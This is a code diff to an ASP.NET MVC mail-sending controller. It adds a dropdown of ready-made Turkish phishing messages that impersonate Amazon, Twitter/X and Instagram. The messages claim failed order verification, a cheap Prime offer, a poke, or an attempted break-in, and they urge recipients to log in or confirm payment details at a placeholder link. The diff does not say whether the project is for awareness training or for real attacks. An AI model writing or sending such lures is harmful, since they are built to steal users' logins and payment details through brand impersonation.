@@ -3,6 +3,10 @@ using System.Net.Mail;
 using System.Net;
 using System.Web;
 using System.Web.Mvc;
+using System.Collections.Generic;
+using System.Web.UI.WebControls;
+using WebApplicationMVC2.Models;
+using System.Web.UI;
 
 namespace WebApplicationMVC2.Controllers
 {
@@ -15,7 +19,26 @@ namespace WebApplicationMVC2.Controllers
 
         public ActionResult SendMail()
         {
-            return View();
+            DropDownViewModel model = new DropDownViewModel
+            {
+                templates = GetDropdownItems(),
+            };
+
+            return View(model);
+        }
+
+        List<SelectListItem> GetDropdownItems()
+        {
+            var templates = new List<SelectListItem>
+                {
+                    new SelectListItem { Value = "Amazon sipariş bilgileriniz teyit edilemedi. Lütfen giriş yapıp bilgilerinizi güncelleyin: LİNK", Text = "Amazon Login" },
+                    new SelectListItem { Value = "Amazon Prime ayrıcalığı şu anda sadece 1,00 TL! Bu sınırlı süreli kampanyayı kaçırmamak" +
+                    " için linkten ödeme bilgilerinizi doğrulayın: LİNK", Text = "Amazon Payment" },
+                    new SelectListItem { Value = "Bir kullanıcı sizi X'te dürttü! Cevap vermek için: LİNK", Text = "Twitter Login" },
+                    new SelectListItem { Value = "Dikkat! birisi size ait olan instagram hesabına erişmeye çalışıyor olabilir." +
+                    " lütfen güvenliğiniz için giriş yapın ve şifrenizi güncelleyin.: LİNK ", Text = "Instagram Login" }
+                };
+            return templates;
         }
 
         [HttpPost]
